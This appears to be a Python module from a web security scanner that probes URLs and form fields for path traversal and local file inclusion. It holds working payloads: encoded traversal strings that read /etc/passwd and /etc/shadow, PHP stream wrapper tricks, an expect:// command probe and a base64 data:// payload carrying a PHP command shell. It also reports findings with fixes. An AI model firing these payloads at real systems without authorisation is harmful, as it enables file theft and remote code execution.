"""
Path Traversal / Local File Inclusion (LFI) Scanner
OWASP A5:2021 — Security Misconfiguration / A01 Broken Access Control
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Tests for:
  - Classic path traversal (../../../etc/passwd)
  - Null byte injection (%00)
  - URL/double-encoding bypass
  - LFI via PHP wrappers (php://filter, php://input, data://)
  - Windows path traversal (..\\..\\)
  - Base64 file read via php://filter
"""

import re
from .base import BaseScanner, Finding

# ── Payloads ──────────────────────────────────────────────────────────────────

# Linux/Unix file targets
LINUX_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "/etc/issue",
    "/etc/os-release",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

# Windows file targets
WINDOWS_TARGETS = [
    "c:\\windows\\win.ini",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "c:\\boot.ini",
    "c:\\inetpub\\wwwroot\\web.config",
]

# Linux file content indicators
LINUX_INDICATORS = {
    "/etc/passwd": ["root:x:", "root:!", "daemon:", "/bin/bash", "/bin/sh"],
    "/etc/shadow": ["root:$", "daemon:!", "nobody:!"],
    "/etc/hosts": ["127.0.0.1", "localhost"],
    "/proc/self/environ": ["PATH=", "HOME=", "USER="],
    "/proc/version": ["Linux version", "gcc version"],
    "/etc/issue": ["Ubuntu", "Debian", "CentOS", "Red Hat", "Alpine"],
    "/var/log/apache2/access.log": ["GET /", "POST /", "Mozilla/5.0"],
    "/var/log/nginx/access.log": ["GET /", "POST /", "Mozilla/5.0"],
}

WINDOWS_INDICATORS = {
    "c:\\windows\\win.ini": ["[fonts]", "[extensions]"],
    "c:\\windows\\system32\\drivers\\etc\\hosts": ["127.0.0.1", "localhost"],
    "c:\\boot.ini": ["[boot loader]", "multi("],
    "c:\\inetpub\\wwwroot\\web.config": ["<configuration>", "appSettings"],
}

def _build_traversal_payloads(file_path: str) -> list[str]:
    """Build a list of traversal payloads for a given target file."""
    payloads = []
    depth = 6
    # Unix-style traversal sequences
    for d in range(2, depth + 1):
        prefix = "../" * d
        payloads += [
            prefix + file_path.lstrip("/"),
            prefix.replace("/", "%2f") + file_path.lstrip("/"),
            prefix.replace("../", "..%2f") + file_path.lstrip("/"),
            prefix.replace("../", "%2e%2e%2f") + file_path.lstrip("/"),
            prefix.replace("../", "%2e%2e/") + file_path.lstrip("/"),
            prefix.replace("../", "..%252f") + file_path.lstrip("/"),  # double URL encode
            # null byte (legacy PHP)
            prefix + file_path.lstrip("/") + "%00",
            prefix + file_path.lstrip("/") + "\x00",
        ]
    # Absolute path
    payloads.append(file_path)
    # Windows-style
    if "\\" not in file_path:
        win_prefix = "..\\" * depth
        payloads.append(win_prefix + file_path.lstrip("/").replace("/", "\\"))
    return payloads


PHP_WRAPPERS = [
    ("php://filter/convert.base64-encode/resource={}", "PHP filter base64 LFI"),
    ("php://filter/read=string.rot13/resource={}", "PHP filter ROT13 LFI"),
    ("php://filter/zlib.deflate/convert.base64-encode/resource={}", "PHP filter zlib LFI"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=", "data:// wrapper (PHP RCE)"),
    ("expect://id", "expect:// wrapper (PHP RCE)"),
]

LFI_PARAMS = [
    "file", "path", "page", "include", "template", "view", "doc",
    "document", "folder", "root", "dir", "lang", "language",
    "src", "source", "load", "read", "content", "resource",
    "category", "mod", "conf", "pg", "pag", "name", "filename",
]


class LFIScanner(BaseScanner):
    """Scans for Path Traversal / Local File Inclusion vulnerabilities."""

    SCANNER_NAME = "Path Traversal / LFI"
    OWASP_CATEGORY = "A01:2021"
    CWE = "CWE-22"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting LFI/Path Traversal scan against {self.target}")

        params = self.get_query_params(self.target)
        for param in params:
            self._test_traversal(self.target, param)
            self._test_php_wrappers(self.target, param)

        # Test common endpoints with file-related params
        test_endpoints = [
            f"{self.target}/?page=home",
            f"{self.target}/?template=main",
            f"{self.target}/?file=index",
            f"{self.target}/include.php?file=header",
            f"{self.target}/index.php?view=home",
            f"{self.target}/download?path=report.pdf",
            f"{self.target}/api/file?name=config",
        ]
        for ep in test_endpoints:
            ep_params = self.get_query_params(ep)
            for param in ep_params:
                self._test_traversal(ep, param)
                self._test_php_wrappers(ep, param)

        # Test form inputs
        forms = self.get_forms(self.target)
        for form in forms:
            self._test_form_lfi(form)

        return self.findings

    def _test_traversal(self, url: str, param: str):
        """Test path traversal payloads for a given URL parameter."""
        for file_path in LINUX_TARGETS[:4]:  # test top 4 linux files
            payloads = _build_traversal_payloads(file_path)
            indicators = LINUX_INDICATORS.get(file_path, ["root:", "daemon:"])

            for payload in payloads[:12]:  # limit payloads per file
                test_url = self.inject_param(url, param, payload)
                resp, evidence = self.http.get(test_url)
                if resp is None:
                    continue

                if resp.status_code == 200 and self.contains_any(resp.text, indicators):
                    self.add_finding(Finding(
                        title=f"Path Traversal / LFI — File Disclosed: {file_path}",
                        severity="CRITICAL",
                        owasp="A01:2021",
                        cwe="CWE-22",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                        url=url,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"Parameter `{param}` allows reading server files via path traversal. "
                            f"The file `{file_path}` was successfully read and its content "
                            "appeared in the HTTP response."
                        ),
                        impact=(
                            "Sensitive file disclosure: /etc/passwd (user enumeration), "
                            "/etc/shadow (password hashes), application source code, "
                            "private keys, database credentials."
                        ),
                        remediation=(
                            "Use os.path.realpath() and verify the resolved path starts with the intended base directory. "
                            "Never pass user input directly to file read functions. "
                            "Implement an allowlist of permitted file names/paths."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://cwe.mitre.org/data/definitions/22.html",
                            "https://portswigger.net/web-security/file-path-traversal",
                        ],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="lfi",
                    ))
                    return  # confirmed, stop for this param

        # Test Windows targets
        for file_path in WINDOWS_TARGETS:
            indicators = WINDOWS_INDICATORS.get(file_path, ["[fonts]"])
            win_payloads = [
                file_path,
                "..\\" * 5 + file_path.lstrip("c:\\"),
                "../" * 5 + file_path.lstrip("c:/").replace("\\", "/"),
            ]
            for payload in win_payloads:
                test_url = self.inject_param(url, param, payload)
                resp, evidence = self.http.get(test_url)
                if resp is None:
                    continue
                if resp.status_code == 200 and self.contains_any(resp.text, indicators):
                    self.add_finding(Finding(
                        title=f"Path Traversal (Windows) — File Disclosed: {file_path}",
                        severity="CRITICAL",
                        owasp="A01:2021",
                        cwe="CWE-22",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                        url=url,
                        parameter=param,
                        payload=payload,
                        description=f"Windows path traversal to `{file_path}` succeeded.",
                        impact="Sensitive Windows file disclosure, potential config/credential access.",
                        remediation="Validate file paths against a strict allowlist. Use Path.resolve() comparisons.",
                        references=["https://portswigger.net/web-security/file-path-traversal"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="lfi",
                    ))
                    return

    def _test_php_wrappers(self, url: str, param: str):
        """Test PHP stream wrapper LFI payloads."""
        for wrapper_template, desc in PHP_WRAPPERS:
            if "{}" in wrapper_template:
                payload = wrapper_template.format("/etc/passwd")
            else:
                payload = wrapper_template

            test_url = self.inject_param(url, param, payload)
            resp, evidence = self.http.get(test_url)
            if resp is None:
                continue

            # base64 or rot13 encoded /etc/passwd contents
            import base64
            try:
                decoded = base64.b64decode(resp.text.strip()).decode("utf-8", errors="ignore")
                if "root:" in decoded or "/bin/bash" in decoded:
                    self.add_finding(Finding(
                        title=f"PHP LFI via Stream Wrapper — {desc}",
                        severity="CRITICAL",
                        owasp="A01:2021",
                        cwe="CWE-22",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        url=url,
                        parameter=param,
                        payload=payload,
                        description=(
                            f"PHP stream wrapper `{desc}` allowed reading file contents. "
                            "Response was base64-encoded /etc/passwd content."
                        ),
                        impact="Source code disclosure, credential theft, potential RCE via log poisoning.",
                        remediation=(
                            "Disable dangerous PHP wrappers: set `allow_url_include=Off` in php.ini. "
                            "Use realpath() validation."
                        ),
                        references=[
                            "https://www.php.net/manual/en/wrappers.php",
                            "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
                        ],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="lfi",
                    ))
                    return
            except Exception:
                pass

            # Check for expect:// RCE indicator
            if "expect://" in payload and self.contains_any(resp.text, ["uid=", "gid=", "root"]):
                self.add_finding(Finding(
                    title="PHP RCE via expect:// Wrapper",
                    severity="CRITICAL",
                    owasp="A01:2021",
                    cwe="CWE-78",
                    cvss_score=10.0,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=payload,
                    description="PHP expect:// wrapper enabled; remote command execution is possible.",
                    impact="Full RCE — attacker can run arbitrary OS commands.",
                    remediation="Set `allow_url_fopen=Off` and `allow_url_include=Off` in php.ini.",
                    references=["https://www.php.net/manual/en/wrappers.expect.php"],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="lfi",
                ))

    def _test_form_lfi(self, form: dict):
        action = form.get("action", self.target)
        method = form.get("method", "get")
        inputs = form.get("inputs", [])
        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            if name.lower() not in LFI_PARAMS and "file" not in name.lower():
                continue
            for payload in ["../../../etc/passwd", "../../etc/hosts"]:
                data = {i.get("name", ""): i.get("value", "test") for i in inputs if i.get("name")}
                data[name] = payload
                if method == "post":
                    resp, evidence = self.http.post(action, data=data)
                else:
                    from urllib.parse import urlencode
                    resp, evidence = self.http.get(f"{action}?{urlencode(data)}")
                if resp is None:
                    continue
                if self.contains_any(resp.text, ["root:x:", "daemon:", "/bin/bash"]):
                    self.add_finding(Finding(
                        title="Path Traversal via Form Field",
                        severity="CRITICAL",
                        owasp="A01:2021",
                        cwe="CWE-22",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                        url=action,
                        parameter=name,
                        payload=payload,
                        description=f"Form field `{name}` at `{action}` allows reading arbitrary files.",
                        impact="Server file disclosure, credential leakage.",
                        remediation="Validate file paths against a strict allowlist. Never pass form input to file read functions.",
                        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="lfi",
                    ))
                    return
